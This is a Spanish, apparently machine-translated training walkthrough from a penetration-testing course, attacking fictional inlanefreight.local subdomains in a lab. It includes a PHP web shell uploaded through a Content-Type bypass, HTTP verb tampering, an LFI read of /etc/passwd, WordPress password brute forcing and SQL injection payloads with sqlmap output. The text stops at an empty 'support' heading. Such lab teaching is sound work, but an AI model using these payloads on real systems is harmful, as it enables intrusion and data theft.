# Enumeración y explotación web

---

Como se mencionó en la sección anterior, las aplicaciones web son donde generalmente pasamos la mayor parte de nuestro tiempo durante una prueba de penetración externa. A menudo presentan una vasta superficie de ataque y pueden sufrir muchas clases de vulnerabilidades que pueden conducir a una ejecución de código remoto o una exposición de datos confidenciales, por lo que debemos ser minuciosos con ellas. Una cosa para recordar es que hay una diferencia entre un`Web Application Security Assessment (WASA)`y un`External Penetration Test`. En una WASA, generalmente tenemos la tarea de encontrar e informar todas y cada una de las vulnerabilidades, sin importar cuán mundano (es decir, una versión del servidor web en los encabezados de respuesta HTTP, una cookie que le faltan la bandera segura o httponly, etc.). No queremos atascarse con este tipo de hallazgos durante una prueba de penetración externa, ya que generalmente tenemos mucho terreno que cubrir. El documento de alcance del trabajo (SOW) debe diferenciar claramente entre los dos tipos de evaluación. Debe afirmar explícitamente que durante una prueba de penetración externa, realizaremos`cursory`Prueba de aplicaciones web, buscando vulnerabilidades de alto riesgo. Si no tenemos muchos hallazgos en absoluto, podemos profundizar en las aplicaciones web, y siempre podemos incluir un Catch-All`Best Practice Recommendation`o`Informational`Encontrar que enumera varios problemas de encabezado de respuesta HTTP relacionados con la seguridad comunes que vemos todo el tiempo, entre otros problemas menores. De esta manera, hemos cumplido el contrato al perseguir los grandes problemas, como la inyección de SQL, la carga de archivos sin restricciones, XSS, XXE, ataques de inclusión de archivos, inyecciones de comandos, etc., pero nos cubrieron con el hallazgo informativo en caso de que el cliente regrese preguntando por qué no informamos X.

---

## Enumeración de la aplicación web

La forma más rápida y eficiente de superar un montón de aplicaciones web es utilizar una herramienta como[Testigo ocular](https://github.com/FortyNorthSecurity/EyeWitness)tomar capturas de pantalla de cada aplicación web como se cubre en el`Attacking Common Applications`módulo en el[Descubrimiento y enumeración de la aplicación](https://academy.hackthebox.com/module/113/section/1088)sección. Esto es particularmente útil si tenemos un alcance masivo para nuestra evaluación y navegar por cada aplicación web a la vez no es factible. En nuestro caso, tenemos`11`Subdominios/Vhosts (por ahora), por lo que vale la pena encender el testigo ocular para ayudarnos, ya que queremos ser lo más eficientes posible para darle al cliente la mejor evaluación posible. Esto significa acelerar cualquier tarea que se pueda realizar`faster`y de manera más eficiente`without the possibility of missing things`. La automatización es excelente, pero si nos faltan la mitad de lo que vamos después, entonces la automatización está haciendo más daño que bien. Asegúrese de comprender lo que están haciendo sus herramientas, y verifique periódicamente las cosas para garantizar que sus herramientas y cualquier scripts personalizado funcione como se esperaba.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

Podemos alimentar a los testigos oculares un archivo .xml nmap o una exploración nessus, que es útil cuando tenemos un gran alcance con muchos puertos abiertos, que a menudo pueden ser el caso durante una prueba de penetración interna. En nuestro caso, solo usaremos el`-f`Marcar para darle la lista de subdominios en un archivo de texto que enumeramos anteriormente.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
Finished in 34.79010033607483 seconds

[*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
n
```

![text](https://academy.hackthebox.com/storage/modules/163/ilfreight_eyewitness.png)

Los resultados del testigo ocular nos muestran múltiples hosts muy interesantes, cualquiera de los cuales podría aprovecharse para obtener un punto de apoyo en la red interna. Trabajemos a través de ellos uno por uno.

---

## blog.inlanefreight.local

Primero es el`blog.inlanefreight.local`subdominio. A primera vista, parece prometedor. El sitio parece ser una instalación de Drupal olvidada o tal vez un sitio de prueba que fue configurado y nunca endurecido. Podemos consultar el[Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089)del`Attacking Common Applications`módulo para ideas.

![text](https://academy.hackthebox.com/storage/modules/163/drupal.png)

Usando`cURL`, podemos ver que Drupal 9 está en uso.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Una búsqueda rápida de Google nos muestra que la versión de drupal estable actual destinada a la producción es[Versión 9.4](https://www.drupal.org/project/drupal/releases), por lo que probablemente tendremos que tener suerte y encontrar algún tipo de configuración errónea, como una contraseña de administración débil para abusar de la funcionalidad incorporada o un complemento vulnerable. Vulnerabilidades conocidas como`Drupalgeddon 1-3`No afecte la versión 9.X de Drupal, por lo que es un callejón sin salida. Tratando de iniciar sesión con algunas combinaciones de contraseña débiles como`admin:admin`, `admin:Welcome1`, etc., no dan fruto. Intentar registrar a un usuario también falla, por lo que pasamos a la siguiente aplicación.

Podríamos observar en nuestro informe que esta instancia de Drupal parece que no está en uso y podría valer la pena eliminar para reducir aún más la superficie general de ataque externo.

---

## Careers.inlaneFreight.local

El siguiente es el subdominio de carreras. Estos tipos de sitios a menudo permiten que un usuario registre una cuenta, cargue un CV y ​​potencialmente una foto de perfil. Esta podría ser una vía interesante de ataque. Navegar primero a la página de inicio de sesión`http://careers.inlanefreight.local/login`, podemos probar algunos omitidos de autenticación comunes e intentar borrar el formulario de inicio de sesión para tratar de omitir la autenticación o provocar algún tipo de mensaje de error o retraso de tiempo que sea indicativo de una inyección SQL. Como siempre, probamos algunas combinaciones de contraseñas débiles como`admin:admin`. También debemos probar los formularios de inicio de sesión (y olvidar los formularios de contraseña si existen) para la enumeración del nombre de usuario, pero ninguno es evidente en este caso.

El`http://careers.inlanefreight.local/apply`La página nos permite solicitar un trabajo y subir un CV. Probar esta funcionalidad muestra que permite que cualquier tipo de archivo cargue, pero la respuesta HTTP no muestra dónde se encuentra el archivo después de la carga. El directorio de bruto no produce ningún director de directorios interesante como`/files`o`/uploads`Eso podría albergar un shell web si podemos cargar con éxito un archivo malicioso.

Siempre es una buena idea probar la funcionalidad de registro de usuarios en cualquier aplicación web que encontremos, ya que pueden conducir a todo tipo de problemas. En la caja HTB[Academia](https://0xdf.gitlab.io/2021/02/27/htb-academy.html), es posible registrarse en una aplicación web y modificar nuestro papel al de un administrador en el momento de registro. Esto se inspiró en un hallazgo real de la prueba de penetración externa donde pude registrarme en una aplicación web orientada a Internet para cinco roles de usuario diferentes. Una vez registrado en esa aplicación, existieron todo tipo de vulnerabilidades IDOR, lo que resultó en una autorización rota en muchas páginas.

Sigamos adelante y registremos una cuenta en`http://careers.inlanefreight.local/register`Y mira a su alrededor. Registramos una cuenta con detalles falsos:`test@test.com`y las credenciales`pentester:Str0ngP@ssw0rd!`. A veces tendremos que usar una dirección de correo electrónico real para recibir un enlace de activación. Podemos usar un servicio de correo electrónico desechable como[Correo de 10 minutos](https://10minutemail.com/)No desactivar nuestra bandeja de entrada o mantener una cuenta ficticia con ProtonMail Mail o similar solo para fines de prueba. Estará contento de que no haya usado su dirección de correo electrónico real la primera vez Burp Suite Active Scanner presenta un formulario y le envía más de 1,000 correos electrónicos en rápida sucesión. Regístrese con credenciales decentemente fuertes también. No desea introducir un problema de seguridad en la aplicación web, tiene la tarea de probar al registrarse con credenciales como`test:test`Eso podría dejarse en la aplicación mucho después de que termine la prueba (aunque, por supuesto, deberíamos enumerar en un apéndice de nuestro informe cualquier modificación realizada durante la prueba, incluso registrándonos en un sitio web de orientación pública).

Una vez registrado, podemos iniciar sesión y navegar. Somos recibidos con nuestra página de perfil en`http://careers.inlanefreight.local/profile?id=9`. Intentando borrar el`id`El parámetro para SQLI, inyección de comandos, inclusión de archivos, XSS, etc., no resulta fructífero. El número de identificación en sí es interesante. Ajustar este número nos muestra que podemos acceder a los perfiles de otros usuarios y ver a qué trabajos se aplicaron. Este es un ejemplo clásico de un`Insecure Direct Object Reference (IDOR)`Vulnerabilidad y definitivamente valdrá la pena informar debido al potencial de exposición a los datos confidenciales.

Después de agotar todas las opciones aquí, nos alejamos con una vulnerabilidad reportable decente para agregar a nuestra lista de hallazgos y pasar a la siguiente aplicación web. Podemos usar cualquier herramienta de forzación bruta del directorio aquí, pero iremos con[Engañado](https://github.com/OJ/gobuster).

---

## dev.inlaneFreight.local

La aplicación web en`http://dev.inlanefreight.local`es simple pero llama la atención. Cualquier cosa con`dev`En la URL o el nombre es interesante, ya que esto podría ser expuesto accidentalmente y plagado de defectos/no preparados para la producción. La aplicación presenta un formulario de inicio de sesión simple titulado`Key Vault`. Esto parece un administrador de contraseñas de cosecha propia o similar y podría conducir a una considerable exposición de datos si podemos entrar. Combinaciones de contraseña débiles y autenticación de las cargas útiles de derivación no nos llevan a ningún lado, así que volvamos a los conceptos básicos y busquemos otras páginas y directorios. Probemos primero con el`common.txt`lista de palabras usando`.php`Extensiones de archivo para la primera ejecución.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

Tenemos algunos éxitos interesantes. Los archivos con un`403`El código de error prohibido generalmente significa que los archivos existen, pero el servidor web no nos permite navegar a ellos de forma anónima. El`uploads`y`upload.php`Las páginas inmediatamente llaman nuestra atención. Si podemos cargar un shell web de PHP, es probable que podamos navegar directamente en el`/uploads`Directorio, que tiene habilitado el listado de directorio. Podemos tener en cuenta esto como un hallazgo de bajo riesgo válido,`Directory Listing Enabled`y capture la evidencia necesaria para hacer que la escritura de informes sea rápida e indolora. Navegar por`/upload.php`nos da un`403 Forbidden`mensaje de error y nada más, lo cual es interesante porque el código de estado es un`200 OK`Código de éxito. Vamos a profundizar en esto más profundo.

Necesitaremos Burp Suite aquí para capturar la solicitud y ver si podemos averiguar qué está pasando. Si capturamos la solicitud y la enviamos al repetidor de eructos y luego requirimos la página usando el`OPTIONS`Método, vemos que se permiten varios métodos:`GET,POST,PUT,TRACK,OPTIONS`. Ciclismo a través de las diversas opciones, cada una nos da un error de servidor hasta que intentemos el`TRACK`método y ver que el`X-Custom-IP-Authorization:`El encabezado se establece en la respuesta HTTP. Podemos consultar el[Ataques web](https://academy.hackthebox.com/module/134/section/1159)módulos`HTTP Verb Tampering`para un repaso sobre este tipo de ataque.

![text](https://academy.hackthebox.com/storage/modules/163/track_method.png)

Jugar un poco con la solicitud y agregar el encabezado`X-Custom-IP-Authorization: 127.0.0.1`a la solicitud HTTP en Burp Repeator y luego solicitar la página con el`TRACK`El método nuevamente produce un resultado interesante. Vemos qué parece ser un formulario de carga de archivo en el cuerpo de respuesta HTTP.

![text](https://academy.hackthebox.com/storage/modules/163/track_method_auth.png)

Si hacemos clic derecho en cualquier lugar del`Response`ventana`Repeater`Podemos seleccionar`show response in browser`, Copie la URL resultante y solicite en el navegador que estamos utilizando con el proxy BURP. Una plataforma de edición de fotos se carga para nosotros.

![text](https://academy.hackthebox.com/storage/modules/163/pixel_shop.png)

Podemos hacer clic en el`Browse`Botón e intente cargar una red web simple con los siguientes contenidos:

Código:php

```php
<?php system($_GET['cmd']); ?>
```

Guarde el archivo como`5351bf7271abaa2267e03c9ef6393f13.php`o algo similar. Es una buena práctica crear nombres de archivos aleatorios al cargar un shell web a un sitio web de orientación pública para que un atacante aleatorio no ocurra con él. En nuestro caso, queremos usar algo protegido o restringido de contraseña a nuestra dirección IP ya que la lista de directorio está habilitada, y cualquiera podría navegar al`/uploads`directorio y encontrarlo. Intentando cargar el`.php`El archivo da como resultado un error: "`JPG, JPEG, PNG & GIF files are allowed.`", que muestra que es probable que esté una validación débil del lado del cliente. Podemos obtener la solicitud posterior, enviarla al repetidor una vez más e intentar modificar el`Content-Type:`encabezado en la solicitud para ver si podemos engañar a la aplicación para que acepte nuestro archivo como válido. Intentaremos alterar el encabezado a`Content-Type: image/png`Pasar nuestro shell web como un archivo de imagen PNG válido. ¡Funciona! Recibimos la siguiente respuesta:`File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php`.

Ahora podemos usar`cURL`Para interactuar con este shell web y ejecutar comandos en el servidor web.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Al verificar el direccionamiento IP del host, no parece que hayamos aterrizado dentro de la red interna InLaneFreight ya que la dirección IP no está dentro del alcance de la red interna. Este puede ser un servidor web independiente, por lo que continuaremos.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

172.18.0.3
```

A partir de aquí, podemos enumerar el host, buscando datos confidenciales, anote otros dos hallazgos:`HTTP Verb Tampering`y`Unrestricted File Upload`y pasar al siguiente anfitrión.

---

## ir.inlaneFreight.local

El siguiente objetivo en nuestra lista es`http://ir.inlanefreight.local`, el portal de relaciones con los inversores de la compañía organizado con WordPress. Para esto podemos consultar el[WordPress - Descubrimiento y enumeración](https://academy.hackthebox.com/module/113/section/1100)Sección de la`Attacking Common Applications`módulo. Encendemos`WPScan`y vea lo que podemos enumerar usando el`-ap`Bandera para enumerar todos los complementos.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] WordPress version 6.0 identified (Latest, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Latest Version: 0.7 (up to date)
 | Last Updated: 2022-04-25T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Latest Version: 1.0.5 (up to date)
 | Last Updated: 2022-06-17T15:21:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:07:09 2022
[+] Requests Done: 35
[+] Cached Requests: 7
[+] Data Sent: 9.187 KB
[+] Data Received: 164.854 KB
[+] Memory used: 224.816 M
```

Desde el escaneo, podemos deducir los siguientes bits de información:

- La versión central de WordPress es la última (6.0 al momento de la escritura)
- El tema en uso es`cbusiness-investment`
- El`b2i-investor-tools`Se instala el complemento
- El`mail-masta`Se instala el complemento

El`Mail Masta`El complemento es un complemento anterior con varias vulnerabilidades conocidas. Podemos usar[este](https://www.exploit-db.com/exploits/50226)Explotar para leer archivos en el sistema de archivos subyacente aprovechando una vulnerabilidad de inclusión de archivos locales (LFI).

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Podemos agregar otro hallazgo a nuestra lista:`Local File Inclusion (LFI)`. A continuación, sigamos adelante y veamos si podemos enumerar a los usuarios de WordPress usando`WPScan`.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:14:33 2022
[+] Requests Done: 28
[+] Cached Requests: 37
[+] Data Sent: 8.495 KB
[+] Data Received: 269.719 KB
[+] Memory used: 176.859 MB
[+] Elapsed time: 00:00:0
```

Encontramos varios usuarios:

- ilfreightwp
- Tomás
- Jaime
- John

Intentemos la fuerza bruta una de las contraseñas de la cuenta utilizando[este](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt)lista de palabras del`SecLists`Repo de Github. Usando`WPScan`De nuevo, recibimos un golpe para el`ilfreightwp`cuenta.

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                              
Trying ilfreightwp / 123123 Time: 00:00:00 <===                                > (10 / 109)  9.17%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:31:34 2022
[+] Requests Done: 186
[+] Cached Requests: 7
[+] Data Sent: 54.2 KB
[+] Data Received: 253.754 KB
[+] Memory used: 241.836 MB
[+] Elapsed time: 00:00:16
```

Desde aquí, podemos navegar a`http://ir.inlanefreight.local/wp-login.php`e inicie sesión usando las credenciales`ilfreightwp:password1`. Una vez iniciado sesión, seremos dirigidos a`http://ir.inlanefreight.local/wp-admin/`donde podemos navegar`http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty`Para editar el archivo 404.php para el tema inactivo`Twenty Twenty`y agregue un shell web PHP para obtener la ejecución del código remoto. Después de editar esta página y lograr la ejecución del código después de los pasos en el[Atacando a WordPress](https://academy.hackthebox.com/module/113/section/1208)Sección de la`Attacking Common Applications`Módulo, podemos registrar otro hallazgo para`Weak WordPress Admin Credentials`y recomiende que nuestro cliente implementa varias medidas de endurecimiento si planean dejar este sitio de WordPress expuesto externamente.

---

## status.inlaneFreight.local

Este sitio parece otro olvidado que no debería estar expuesto a Internet. Parece que es algún tipo de aplicación interna para buscar a través de registros. Ingresando una sola cita (`'`) Lanza un mensaje de error MySQL que indica la presencia de una vulnerabilidad de inyección SQL:`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`. Podemos explotar esto manualmente usando una carga útil como:

Código:sql

```sql
' union select null, database(), user(), @@version -- //
```

Este es un ejemplo de un[Ataque de la unión de inyección SQL](https://academy.hackthebox.com/module/33/section/806).

También podemos usar SQLMAP para explotar esto también. Primero, capture la solicitud de publicación usando BURP, guárdelo en un archivo y marque el`searchitem`parámetro con un`*`Entonces SQLMAP sabe dónde inyectar.

  Enumeración y explotación web

```shell-session
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```

A continuación, ejecutamos esto a través de SQLMAP de la siguiente manera:

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql 

<SNIP>

[00:07:24] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 6921=6921#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x716a7a7171),NULL#
---
[00:07:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[00:07:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:07:38 /2022-06-21/
```

A continuación, podemos enumerar las bases de datos disponibles y ver que el`status`la base de datos es particularmente interesante:

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql --dbs

<SNIP>

---
[00:09:24] [INFO] testing MySQL
[00:09:24] [INFO] confirming MySQL
[00:09:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:09:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[00:09:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:09:24 /2022-06-21/
```

Centrándose en el`status`base de datos, encontramos que tiene solo dos tablas:

  Enumeración y explotación web

```shell-session
xnoxos@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables

<SNIP>

---
[00:10:29] [INFO] testing MySQL
[00:10:29] [INFO] confirming MySQL
[00:10:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:10:29] [INFO] fetching tables for database: 'status'
Database: status
[2 tables]
+---------+
| company |
| users   |
+---------+
```

Desde aquí, podríamos intentar descargar todos los datos del`status`base de datos y registrar otro hallazgo más,`SQL Injection`. Prueba esto manualmente usando el[Fundamentos de inyección SQL](https://academy.hackthebox.com/module/details/33)módulo como guía y consulte el[SQLMAP Essentials](https://academy.hackthebox.com/module/details/58)Módulo Si necesita ayuda con el enfoque basado en herramientas.

---

## Support.inlaneFreight.local

